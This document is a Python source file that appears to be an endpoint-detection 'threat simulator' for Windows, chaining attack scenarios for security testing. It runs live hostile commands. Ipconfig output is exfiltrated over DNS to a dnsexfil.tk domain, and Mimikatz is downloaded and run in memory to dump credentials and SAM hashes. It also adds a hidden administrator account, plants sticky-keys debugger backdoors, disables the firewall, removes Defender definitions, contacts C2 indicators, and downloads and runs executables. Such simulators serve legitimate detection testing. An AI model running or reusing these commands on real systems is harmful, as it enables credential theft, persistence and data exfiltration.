import base64
import ipaddress
import os
import platform
import random
import requests
import string
import socket
import subprocess
import sys
import tempfile
import time
import urllib3
from concurrent.futures.thread import ThreadPoolExecutor

# Copyright (c) 2021
# Author: Matt Smith <https://github.com/Mediab0t/>

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

__author__ = "Matt Smith <https://github.com/Mediab0t/>"
__copyright__ = "Copyright 2021, Palo Alto Networks, Inc."
__license__ = "GPLv3"
__version__ = "0.9.0"
__status__ = "alpha-milestone-01"
__repository__ = "https://github.com/Mediab0t/xdr-threatsimulator"

''' Supporting Functions '''


def exec_calc_exec_time(start):
	"""
	Calculates the time delta between the supplied start argument and now

	Args:
		start (int, float): Variable containing the start time data

	"""
	end = round(time.time() - start, 2)
	
	if end > 60:
		print('Execution finished in', str(round(end, 1)), 'seconds (' + str(round(end / 60, 2)), 'minutes)')
	else:
		print('Execution finished in', str(round(end, 1)), 'seconds')


def exec_dns_lookup(entry, dga):
	"""
	Performs a DNS lookup via the nslookup.exe program
	
	Args:
		entry (str): Entry to query
		dga (bool): Is entry from the internal DGA?
	"""
	
	try:
		
		if 'http://' in entry or 'https://' in entry:
			domain = urllib3.util.parse_url(entry).netloc
		else:
			domain = entry
		
		try:
			ipaddress.ip_address(domain)
			record_type = 'PTR'
		except ValueError:
			record_type = 'A'
		
		if dga is True:
			record_type = 'DGA:' + record_type
		
		params = '-nodebug -nodefname -nosearch -norecurse -novc -noignoretc -port=53 -type=A -timeout=' + str(
			env['timeout']) + ' -retry=1'
		cmd = 'nslookup.exe ' + params + ' ' + domain + ' ' + str(env['dns_server'])
		print('[DNS:' + record_type + '] Querying:', entry, '[' + cmd + ']')
		subprocess.call(cmd, shell=False)
	
	except subprocess.SubprocessError as e:
		print(e)


def exec_http_lookup(entry, ps):
	"""
	Attempts to create a http/https connection to the target (entry)
	
	Args:
		entry (str): URL for connection attempt(s)
		ps (bool): Use Powershell (true) or curl (false)
	"""
	url = urllib3.util.parse_url(entry)
	urls = []
	www = False
	url_http_www = None
	url_https_www = None
	cmd = None
	
	if url.scheme is None:
		
		if not url.url.startswith('www.'):
			
			try:
				ipaddress.ip_address(url.url)
				pass
			except ValueError:
				url_http_www = 'http://www.' + url.url
				url_https_www = 'https://www.' + url.url
				www = True
		
		else:
			www = False
		
		url_http = 'http://' + url.url
		url_https = 'https://' + url.url
		
		if www is True:
			urls = [url_http, url_https, url_http_www, url_https_www]
			del url, url_http, url_https, url_http_www, url_https_www
		else:
			urls = [url_http, url_https]
			del url, url_http, url_https
	
	else:
		# TODO: Add logic to add/remove http/https as needed
		pass
	
	for url in urls:
		try:
			
			if ps is True:
				cmd = 'powershell.exe -exec bypass -C "try {$r = Invoke-WebRequest -UseBasicParsing -Uri ' + url + ' -TimeoutSec 1;'
				cmd += 'Write-Host "[HTTP] Successfully connected to ' + url + '"} catch {'
				cmd += 'Write-Host "[HTTP] Could not connect to ' + url + '" }"'
			else:
				# TODO: Add curl commands
				pass
			
			# print('[HTTP] Executing:', str(cmd))
			subprocess.call(cmd, shell=False)
		
		except subprocess.SubprocessError as e:
			print(e)


def exec_dga_generate(length, tlds):
	"""
	This function will generate a random domain name
	"""
	
	generate_subdomains = bool(random.getrandbits(1))
	generate_hex = bool(random.getrandbits(1))
	generate_b64 = bool(random.getrandbits(1))
	
	digits = string.digits
	letters = string.ascii_lowercase + digits
	
	if generate_subdomains is True:
		length = random.randint(8, 20)
		
		s1 = random.randint(0, 255)
		s2 = ''.join(random.choice(letters) for _ in range(length))
		s3 = ''.join(random.choice(letters) for _ in range(length))
		s4 = ''.join(random.choice(letters) for _ in range(length))
		s5 = ''.join(random.choice(letters) for _ in range(length))
		s6 = ''.join(random.choice(letters) for _ in range(length))
		
		if generate_hex is True:
			length = 4
			
			h2 = ''.join(random.choice(letters) for _ in range(length))
			h3 = ''.join(random.choice(letters) for _ in range(length))
			h4 = ''.join(random.choice(letters) for _ in range(length))
			h5 = ''.join(random.choice(letters) for _ in range(length))
			h6 = ''.join(random.choice(letters) for _ in range(length))
			h7 = ''.join(random.choice(letters) for _ in range(length))
			h8 = ''.join(random.choice(letters) for _ in range(length))
			h9 = ''.join(random.choice(letters) for _ in range(length))
			
			s2 = '0x' + h2.encode('utf-8').hex() + '.0x' + h3.encode('utf-8').hex() + '.'
			s3 = '0x' + h4.encode('utf-8').hex() + '.0x' + h5.encode('utf-8').hex() + '.'
			s4 = '0x' + h6.encode('utf-8').hex() + '.0x' + h7.encode('utf-8').hex() + '.'
			s5 = '0x' + h8.encode('utf-8').hex() + '.0x' + h9.encode('utf-8').hex() + '.'
			s6 = s6 + '.'
		
		else:
			s2 = s2 + '.'
			s3 = s3 + '.'
			s4 = s4 + '.'
			s5 = s5 + '.'
			s6 = s6 + '.'
		
		s7 = ''.join(random.choice(tlds))
		
		result = str(s1) + '.' + s2 + s3 + s4 + s5 + s6 + s7
	
	else:
		
		if generate_b64 is True:
			length = random.randint(8, 24)
			result = ''.join(random.choice(letters) for _ in range(length))
			result = result.encode('ascii')
			result = base64.b64encode(result).decode('ascii').replace('=', '')
		else:
			result = ''.join(random.choice(letters) for _ in range(length))
		
		result += '.'
		result += ''.join(random.choice(tlds))
	
	ioc_dga.append(result)


def exec_tcp_scan(host, port):
	"""
	This function will perform a tcp scan of the host on a given port
	"""
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(env['timeout'])
	
	try:
		s.connect((str(host), port))
		print('tcp/' + str(port), 'is open on host', host)
		tcp_scan_open[str(host)]['tcp'].append(str(port))
	
	except socket.error:
		print('tcp/' + str(port), 'is closed on host', host)
	
	finally:
		s.close()


def exec_convert_bytes(input_bytes):
	"""
	Convert raw byte values to human readable formats

	Args:
		input_bytes (int): Raw bytes value to convert

	Returns:
		str: Returns formatted value of input_bytes

	Raises:
		AssertionError: Raises an exception if assertion checks fail
	"""
	
	assert isinstance(input_bytes, int), "Expecting integer for parameter: input_bytes"
	
	# Courtesy of: https://stackoverflow.com/questions/12523586/python-format-size-application-converting-b-to-kb-mb-gb-tb
	b = int(input_bytes)
	kilobyte = float(1024)
	megabyte = float(kilobyte ** 2)
	gigabyte = float(kilobyte ** 3)
	terabyte = float(kilobyte ** 4)
	
	if b < kilobyte:
		return '{0} {1}'.format(b, 'Bytes')
	elif kilobyte <= b < megabyte:
		return '{0:.2f} KB'.format(b / kilobyte)
	elif megabyte <= b < gigabyte:
		return '{0:.2f} MB'.format(b / megabyte)
	elif gigabyte <= b < terabyte:
		return '{0:.2f} GB'.format(b / gigabyte)
	elif terabyte <= b:
		return '{0:.2f} TB'.format(b / terabyte)


''' Scenarios '''


def scenario_00_template():
	"""
	Scenario 00 - Template
	"""
	
	start = time.time()
	
	print(sep)
	print('Scenario 00 - Template')
	print(sep)
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


def scenario_01_ioc_dns_lookup():
	"""
	Scenario 01 - Perform nslookup queries for each entry found in the ioc directory
	"""
	
	start = time.time()
	
	print(sep)
	print('Scenario 01 - Perform nslookup queries for each entry found in the ioc directory')
	print('Resource Directory [IOC]:', str(res_dir['ioc']))
	print(sep)
	
	try:
		ioc_files = os.listdir(res_dir['ioc'])
		
		for ioc_file in ioc_files:
			with open(res_dir['ioc'] + ioc_file) as f:
				print(sep)
				print(ioc_file)
				
				entries = [line.rstrip().lower() for line in f]
				count = len(entries)
				
				print('Entries:', str(count))
				print(sep)
				
				for entry in entries:
					ioc_all.append(entry)
					exec_dns_lookup(entry, False)
	
	except FileNotFoundError as e:
		print(e)
	
	count = len(ioc_all)
	print(sep)
	print('Processed', str(count), 'Indicators of Compromise (IOC) from:', str(res_dir['ioc']))
	exec_calc_exec_time(start)
	print(sep)


def scenario_02_ioc_http_lookup(ps=True):
	"""
	Scenario 02 - Perform powershell or curl queries for each entry found in the ioc directory
	
	Args:
		ps (bool): Use Powershell (true) or curl (false)
	"""
	start = time.time()
	
	print(sep)
	print('Scenario 02 - Perform powershell or curl queries for each entry found in the ioc directory')
	print('Resource Directory [IOC]:', str(res_dir['ioc']))
	print(sep)
	
	try:
		
		ioc_files = os.listdir(res_dir['ioc'])
		entries_all = []
		
		for ioc_file in ioc_files:
			with open(res_dir['ioc'] + ioc_file) as f:
				print(sep)
				print(ioc_file)
				
				entries = [line.rstrip().lower() for line in f]
				count = len(entries)
				entries_all.append(entries)
				
				print('Entries:', str(count))
				print(sep)
		
		threads = []
		with ThreadPoolExecutor(max_workers=env['max_threads']) as executor:
			for entry in entries_all:
				print('[THREAD] Spawning thread for:', entry)
				threads.append(executor.submit(exec_http_lookup, entry, ps))
	
	except FileNotFoundError as e:
		print(e)
	
	count = len(ioc_all)
	print(sep)
	print('Processed', str(count), 'Indicators of Compromise (IOC) from:', str(res_dir['ioc']))
	exec_calc_exec_time(start)
	print(sep)


def scenario_03_dns_dga(iterations):
	"""
	Scenario 03 - Mimic a Domain Generating Algorithm (DGA)
	"""
	
	start = time.time()
	
	print(sep)
	print('Scenario 03 - Domain Generating Algorithm\'s (DGA)')
	print('This scenario will attempt to mimic the behaviour of a DGA')
	
	dga_predefined = res_dir['dns'] + 'dns_dga_predefined.txt'
	dga_tlds = res_dir['dns'] + 'dns_dga_tlds.txt'
	
	try:
		count_predefined = len(open(dga_predefined).readlines())
		count_tlds = len(open(dga_tlds).readlines())
		
		print('Predefined Domains:        ', str(count_predefined))
		print('Unique TLDs to use in DGA: ', str(count_tlds))
		print('Random Domains to Generate:', str(iterations))
		print(sep)
		
		with open(dga_predefined) as f:
			dga_domains = [line.rstrip() for line in f]
		
		with open(dga_tlds) as f:
			tlds = [line.rstrip() for line in f]
		
		print('Performing lookups for', str(count_predefined), 'predefined domains...')
		print(sep)
		
		for entry in dga_domains:
			exec_dns_lookup(entry, False)
		
		print(sep)
		print('Generating', str(iterations), 'random domains using internal DGA...')
		print(sep)
		
		i = 0
		while i < iterations:
			length = random.randint(8, 63)
			print('[DGA][' + str(i) + '] Generating random domain with length:', str(length))
			exec_dga_generate(length, tlds)
			i = i + 1
		
		print(sep)
		print('Performing DNS lookups for', str(iterations), 'random domains generated using internal DGA...')
		print(sep)
		
		for entry in ioc_dga:
			exec_dns_lookup(entry, True)
	
	except FileNotFoundError as e:
		print(e)
		return None
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


def scenario_04_dns_exfiltrate():
	"""
	Scenario 04 - Attempt to exfiltrate data via DNS
	"""
	
	start = time.time()
	
	print(sep)
	print('Scenario 04 - Attempt to exfiltrate data via DNS')
	print(sep)
	
	params = '-nodebug -nodefname -nosearch -norecurse -novc -noignoretc -port=53 -type=A -timeout=' + str(
		env['timeout']) + ' -retry=1'
	ns_cmd = 'nslookup.exe ' + params + ' $final ' + str(env['dns_server'])
	
	cmd = "cmd.exe /C ipconfig /all > output && certutil -encodehex -f output output.hex 4 && powershell $text=Get-Content output.hex;$subdomain=$text.replace(' ','');$j=11111;foreach($i in $subdomain){ $final=$j.tostring()+'.'+$i+'.dnsexfil.tk.';$j += 1; " + ns_cmd + " }"
	print('[SYSTEM] Executing:', str(cmd))
	
	try:
		subprocess.call(cmd, shell=False)
	except subprocess.SubprocessError as e:
		print(e)
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


def scenario_05_rec_local(cleanup=True, f_bat='recon.bat', f_out='recon_out.txt'):
	"""
	Scenario 04 - Local System Reconnaissance
	"""
	
	# TODO: Investigate piping output to terminal and to file
	
	start = time.time()
	
	print(sep)
	print("Scenario 04 - Local System Reconnaissance")
	print(sep)
	print('This scenario will perform enumeration and reconnaissance of the local system')
	print(sep + '\n')
	
	commands_exec = [
		'systeminfo',
		'hostname',
		'whoami',
		'whoami /priv',
		'findstr /spin "password" *.*',
		'tasklist /SVC',
		'wmic qfe get Caption,Description,HotFixID,InstalledOn',
		'wmic qfe list full',
		'net users',
		'net localgroups',
		'net localgroup Administrators',
		'ipconfig /all',
		'route print',
		'arp -A',
		'netstat -ano',
		'netsh firewall set opmode mode=DISABLE',
		'net user /add mitre M$TERTEST!!',
		'net localgroup administrators mitre /ADD',
		'reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist" /v mitre /t REG_DWORD /d 0 /f'
		'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe" /v Debugger /t REG_SZ /d C:\\Windows\\System32\\cmd.exe /f',
		'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /t REG_SZ /d C:\\Windows\\System32\\cmd.exe /f',
		'powershell -exec bypass -C Get-ChildItem -Recurse -Force',
		'wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%',
		'systeminfo',
		'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"',
		'wmic qfe get Caption,Description,HotFixID,InstalledOn',
		'hostname',
		'DRIVERQUERY',
		'cmd.exe /C set',
		'nslookup %LOGONSERVER%.%USERDNSDOMAIN%',
		'powershell.exe -exec bypass -C Get-Disk',
		'powershell.exe -exec bypass -C Get-PSDrive',
		'powershell.exe -exec bypass -C Get-ComputerInfo',
		'wmic logicaldisk get caption,description,providername',
		'WMIC /Node:localhost /Namespace:\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List',
		'sc query windefend',
		'"C:\\Program Files\\Windows Defender\\MpCmdRun.exe" -RemoveDefinitions -All',
		'cmd.exe /C dir C:\\$Recycle.Bin /s /b',
		'schtasks /query /fo LIST /v',
		'schtasks /query /fo LIST 2>nul | findstr TaskName',
		'schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\\|notepad.exe" | grep -B 1 SYSTEM',
		'tasklist /V',
		'tasklist /SVC',
		'net start',
		'wmic service list brief',
		'sc query',
		'cmd.exe /C dir /a "C:\\Program Files"',
		'cmd.exe /C dir /a "C:\\Program Files (x86)"',
		'powershell -exec bypass -C Get-ChildItem -Recurse -Force -Path "C:\\Program Files"',
		'powershell -exec bypass -C Get-ChildItem -Recurse -Force -Path "C:\\Program Files (x86)"',
		'reg query HKEY_LOCAL_MACHINE\\SOFTWARE',
		'cmd.exe /C echo %USERDOMAIN%',
		'cmd.exe /C echo %USERDNSDOMAIN%',
		'cmd.exe /C echo %logonserver%',
		'cmd.exe /C set logonserver',
		'cmd.exe /C set log',
		'net.exe groups /domain',
		'net.exe group "domain computers" /domain',
		'net.exe view /domain',
		'net.exe group "Domain Controllers" /domain',
		'net.exe group "Domain Admins" /domain',
		'net.exe localgroup administrators /domain',
		'net.exe user /domain',
		'net.exe user administrator /domain',
		'net.exe accounts /domain',
		'nltest.exe /domain_trust',
		'qwinsta.exe',
		'klist.exe sessions',
		'net.exe accounts',
		'powershell.exe -exec bypass -C "type C:\\WINDOWS\\System32\\drivers\\etc\\hosts"',
		'ipconfig /all',
		'netsh.exe firewall show state',
		'netsh.exe advfirewall firewall show rule name=all',
		'netsh.exe firewall show config',
		'netsh.exe Advfirewall show allprofiles',
		'reg.exe query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s',
		'curl -sS --insecure ifconfig.me/ip'
	]
	
	commands_cleanup = [
		'netsh firewall set opmode mode=ENABLE',
		'netsh advfirewall set opmode mode=ENABLE',
		'reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe" /v Debugger  /f',
		'reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v Debugger /f',
		'reg delete "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v UpdateSvc /f',
		'net user mitre /delete',
	]
	
	with open(f_bat, 'w+') as f:
		for command in commands_exec:
			f.write(command + '\n')
	
	for command in commands_exec:
		try:
			print(sep)
			print('[SYSTEM] Executing:', str(command))
			subprocess.call(command, shell=False)
		except subprocess.SubprocessError as e:
			print(e)
	
	try:
		cmd = f_bat + ' > ' + f_out + ' 2>&1'
		subprocess.call(cmd)
	except subprocess.SubprocessError as e:
		print(e)
	
	if cleanup is True:
		print('[SYSTEM] Cleanup requested...')
		for command in commands_cleanup:
			try:
				print('[SYSTEM] Executing:', str(command))
				subprocess.call(command, shell=False)
			except subprocess.SubprocessError as e:
				print(e)
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


def scenario_06_rec_network(network, ports=None):
	"""
	Scenario 05 - Network Reconnaissance (TCP Port Scans)
	"""
	
	start = time.time()
	
	print(sep)
	print("Scenario 05 - Network Reconnaissance")
	print('This scenario will perform reconnaissance of the designated subnet using TCP port scans')
	print(sep)
	
	try:
		network = ipaddress.IPv4Network(network)
		
		if ports is None:
			ports = [20, 21, 22, 23, 25, 53, 69, 79, 80, 81, 88, 110, 111, 119, 135, 139, 143, 161, 162, 194, 443, 445,
			         530, 587, 995, 1024, 1723, 3306, 3389, 4567, 5000, 5060, 5900, 7547, 7676, 8000, 8080, 8081, 8082,
			         8443, 10000]
		else:
			ports = ports
		
		print('Preparing to scan network:', str(network))
		print('Ports to scan:', str(ports))
		
		threads = []
		with ThreadPoolExecutor(max_workers=env['max_threads']) as executor:
			for host in network.hosts():
				tcp_scan_open[str(host)] = {'tcp': []}
				
				for port in ports:
					print('[THREAD] Spawning thread for:', str(host) + ':' + str(port))
					threads.append(executor.submit(exec_tcp_scan, host, port))
		
		for host in network.hosts():
			if not tcp_scan_open[str(host)]['tcp']:
				del tcp_scan_open[str(host)]
			else:
				print(sep)
				print('Open ports found:')
				print(str(host) + ':', ', '.join(str(x) for x in tcp_scan_open[str(host)]['tcp']))
	
	except (ipaddress.AddressValueError, ipaddress.NetmaskValueError, ValueError) as e:
		print(e)
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


def scenario_07_mimikatz_ps():
	"""
	Scenario 07 - Download and Execute Mimikatz from Powershell Memory Space
	Powershell Module courtesy of BC-Security (https://www.bc-security.org/)
	"""
	
	start = time.time()
	
	mimikatz_url = 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'
	ps_command = 'powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString(\'' + mimikatz_url + '\');Invoke-Mimikatz -DumpCerts;Invoke-Mimikatz -DumpCreds;Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'"'
	
	print(sep)
	print('Scenario 07 - Download and Execute Mimikatz from Powershell Memory Space')
	print('Powershell Module courtesy of BC-Security (https://www.bc-security.org/)')
	print(sep)
	print('Mimikatz PS Module:', str(mimikatz_url))
	print('Powershell Command:', str(ps_command))
	print(sep)
	
	print('Executing...')
	
	try:
		subprocess.call(ps_command, shell=False)
	except subprocess.SubprocessError as e:
		print(e)
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


def scenario_08_undetermined():
	"""
	Scenario 08 - Undetermined
	"""
	
	start = time.time()
	
	print(sep)
	print('Scenario 08 - Undetermined')
	print(sep)
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


def scenario_09_wf_test(iterations, ssl=False, ps=False):
	"""
	Scenario 09 - Download and execute the WildFire test file
	"""
	
	start = time.time()
	
	print(sep)
	print('Scenario 09 - Download and execute the WildFire test file (' + str(iterations) + ' times)')
	
	if ssl is True:
		schema = 'https://'
	else:
		schema = 'http://'
	
	f_type = 'pe'
	
	url = schema + 'wildfire.paloaltonetworks.com/publicapi/test/' + f_type
	
	print('Downloading from:', str(url))
	
	if ps is True:
		cmd = 'powershell.exe -exec bypass -C "try {$r = Invoke-WebRequest -UseBasicParsing -Uri ' + url + ' -TimeoutSec 5 -Outfile "{output}";'
		cmd += 'Start-Process -FilePath "{output}}" -Verb RunAs"} catch {'
		cmd += 'Write-Host "[HTTP] Could not download file from ' + url + '" }"'
		print('Downloading via Powershell with command:', str(cmd))
		del cmd
	else:
		print('Downloading via curl with command: curl.exe --insecure --output {output}', str(url))
	
	print(sep)
	
	i = 0
	while i < iterations:
		out = str(i) + '_' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16)) + '.exe'
		
		if ps is True:
			cmd = 'powershell.exe -exec bypass -C "try {$r = Invoke-WebRequest -UseBasicParsing -Uri ' + url + ' -TimeoutSec 5 -Outfile "' + out + '";'
			cmd += 'Write-Host "[HTTP] Successfully downloaded: ' + out + ';Start-Process -FilePath "' + out + '" -Verb RunAs"} catch {'
			cmd += 'Write-Host "[HTTP] Could not download file from ' + url + '" }"'
		else:
			cmd = 'curl.exe --insecure --output ' + out + " " + url + ""
		
		print('[' + str(i) + '] Downloading and executing:', out)
		
		try:
			subprocess.call(cmd, shell=False)
			
			if ps is False:
				subprocess.call(out, shell=False)
		
		except subprocess.SubprocessError as e:
			print(e)
		
		i = i + 1
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


def scenario_10_btp_vbs():
	"""
	Scenario 10 - Execute Microsoft VBScript to trigger XDR BTP Module(s)
	"""
	
	start = time.time()
	
	vbs_f = res_dir['malware'] + 'btp_01.vbs'
	
	print(sep)
	print('Scenario 10 - Execute Microsoft VBScript to trigger XDR BTP Module(s)')
	print('VBScript:', str(vbs_f))
	print(sep)
	
	f_chk = os.path.isfile(vbs_f)
	
	if f_chk is True:
		
		try:
			subprocess.call('explorer.exe ' + vbs_f, shell=False)
		except subprocess.SubprocessError as e:
			print(e)
	
	else:
		print(str(vbs_f), 'does not exist! Aborting scenario...')
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


def scenario_11_create_temp_files(iterations, file_size_limit):
	"""
	Scenario 11 - Create random files in the temp directory
	"""
	
	start = time.time()
	
	# Check if file size is lower than 64KB, if it is generate a new value between 64KB and 1GB
	if file_size_limit < 64000:
		file_size_limit = 1073741824
	
	print(sep)
	print('Scenario 11 - Create random files in the temp directory with random sizes')
	print('Iterations:', str(iterations), ' | Upper File Size Limit:', str(exec_convert_bytes(file_size_limit)))
	print(sep)
	
	i = 0
	while i < iterations:
		file_size = random.randint(64000, file_size_limit)
		file_name = res_dir['temp'] + str(i) + '_' + ''.join(
			random.choices(string.ascii_uppercase + string.digits, k=32)) + '.exe'
		
		print('[SYSTEM][' + str(i) + '] Creating file:', str(file_name), ' with size:',
		      str(exec_convert_bytes(file_size)))
		cmd = 'fsutil.exe file createnew ' + file_name + ' ' + str(file_size)
		
		try:
			subprocess.call(cmd, shell=False)
		except subprocess.SubprocessError as e:
			print(e)
		
		i = i + 1
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


def scenario_12_babyshark_c2():
	"""
	Scenario 12 - Emulate Babyshark C2
	"""
	
	start = time.time()
	
	print(sep)
	print('Scenario 12 - Emulate Babyshark C2')
	print(sep)
	
	try:
		
		ioc_babyshark = res_dir['ioc'] + 'c2_ioc_babyshark.txt'
		
		with open(ioc_babyshark) as f:
			entries = [line.rstrip() for line in f]
			
			for entry in entries:
				print('Found:', entry)
			
			for entry in entries:
				headers = {
					'Babyshark': '/lib/Szgfj0.hta',
					'password': 'b4bysh4rk'
				}
				
				if not entry.startswith('http') or not entry.startswith('https'):
					entry = 'http://' + entry
				
				try:
					r = requests.get(url=entry, headers=headers, timeout=(env['timeout'] * 2))
					
					if r.status_code == 200:
						print('[HTTP] Successfully got response from:', entry)
					else:
						print('[HTTP] No response from:', entry)
				
				except Exception as e:
					print(e)
	
	except FileNotFoundError as e:
		print('Could not find c2_ioc_babyshark.txt')
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


def scenario_13_memory_hog(multiplier, s=10):
	"""
	Scenario 13 - Attempt to hog n x GB's of memory
	"""
	
	start = time.time()
	array = (1024 * 1024 * 1024)
	
	print(sep)
	print('Scenario 13 - Attempt to hog up to', str(exec_convert_bytes(array * multiplier)), 'of system memory')
	print(sep)
	
	print('[SYSTEM] Attempting to create', str(exec_convert_bytes(array * multiplier)), 'bytearray...')
	b = bytearray(array * multiplier)
	print('[SYSTEM] Bytearray generated, sleeping for ' + str(s) + ' seconds...')
	time.sleep(s)
	print('[SYSTEM] Destroying bytearray...')
	del b
	
	print(sep)
	exec_calc_exec_time(start)
	print(sep)


''' Main '''


def main():
	"""
	Main Function
	"""
	
	print(sep)
	print(banner)
	print('Release:', __version__ + '-' + __status__)
	print('Author:', __author__)
	print('This software is available under the', __license__, 'license')
	print(sep)
	print('Resource Directory [DNS]: ', str(res_dir['dns']))
	print('Resource Directory [IOC]: ', str(res_dir['ioc']))
	print('Resource Directory [MAL]: ', str(res_dir['malware']))
	print('CPU Architecture:         ', str(env['os_machine']))
	print('CPU Cores:                ', str(env['cpu_cores']))
	print('Max Python Worker Threads:', str(env['max_threads']))
	print('Hostname:                 ', str(env['os_name']))
	print('OS Release:               ', str(env['os_release']))
	print('OS System:                ', str(env['os_system']))
	print('OS Version:               ', str(env['os_version']))
	print('Python Runtime:           ', str(env['python_ver']))
	print('Execution Timeout:        ', str(env['timeout']), 'second(s)')
	time.sleep(5)
	
	try:
		start = time.time()
		
		scenario_01_ioc_dns_lookup()
		scenario_02_ioc_http_lookup(True)
		scenario_03_dns_dga(128)
		scenario_04_dns_exfiltrate()
		scenario_05_rec_local(False)
		scenario_06_rec_network('172.17.0.0/24')
		scenario_07_mimikatz_ps()
		# scenario_08_undetermined()
		scenario_09_wf_test(32, False, False)
		# scenario_10_btp_vbs()
		scenario_11_create_temp_files(8, random.randint(64000, 1073741824))
		scenario_12_babyshark_c2()
		scenario_13_memory_hog(4)
		
		print('\n\n' + sep)
		exec_calc_exec_time(start)
		print(sep)
		input('\nPress any key to exit...')
		sys.exit(0)
	
	except KeyboardInterrupt:
		print('\n\nTerminating process...')
		sys.exit(1)


if __name__ in ['__main__', 'builtin', 'builtins']:
	
	''' Perform initial setup '''
	sep = 128 * '-'
	cwd = os.getcwd()
	
	res_dir = {
		'dns': cwd + '\\res\\dns\\',
		'ioc': cwd + '\\res\\ioc\\',
		'malware': cwd + '\\res\\malware\\',
		'temp': tempfile.gettempdir() + '\\'
	}
	
	# Store all our IOC's, useful for counting
	ioc_all = []
	ioc_dga = []
	
	# Store results from our tcp port scans
	tcp_scan_open = {}
	
	# List of DNS servers, script will randomly select 1 to use
	dns_servers = ['1.1.1.1', '8.8.4.4', '8.8.8.8', '9.9.9.10', '208.67.222.2']
	dns_server = random.choice(dns_servers)
	
	env = {
		'cpu_cores': os.cpu_count(),
		'dns_server': dns_server,
		'os_machine': platform.machine(),
		'os_name': platform.node(),
		'os_release': platform.release(),
		'os_system': platform.system(),
		'os_version': platform.version(),
		'python_ver': platform.python_version(),
		'timeout': 1
	}
	
	del dns_servers
	del dns_server
	
	max_threads = int(env['cpu_cores']) * 4
	
	if max_threads >= 32:
		env['max_threads'] = 32
	else:
		env['max_threads'] = max_threads
	
	del max_threads
	
	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
	
	banner = """
██╗  ██╗██████╗ ██████╗     ████████╗██╗  ██╗██████╗ ███████╗ █████╗ ████████╗███████╗██╗███╗   ███╗
╚██╗██╔╝██╔══██╗██╔══██╗    ╚══██╔══╝██║  ██║██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔════╝██║████╗ ████║
 ╚███╔╝ ██║  ██║██████╔╝       ██║   ███████║██████╔╝█████╗  ███████║   ██║   ███████╗██║██╔████╔██║
 ██╔██╗ ██║  ██║██╔══██╗       ██║   ██╔══██║██╔══██╗██╔══╝  ██╔══██║   ██║   ╚════██║██║██║╚██╔╝██║
██╔╝ ██╗██████╔╝██║  ██║       ██║   ██║  ██║██║  ██║███████╗██║  ██║   ██║   ███████║██║██║ ╚═╝ ██║
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝╚═╝     ╚═╝
                                                                                                    """
	
	if 'Windows' in env['os_system']:
		env['win_nt'] = True
		main()
	else:
		print(sep)
		print('XDR Threat Simulator')
		print(sep)
		print('[ERROR] This software is currently only available for the Windows operating system')
		print(sep)
		main()
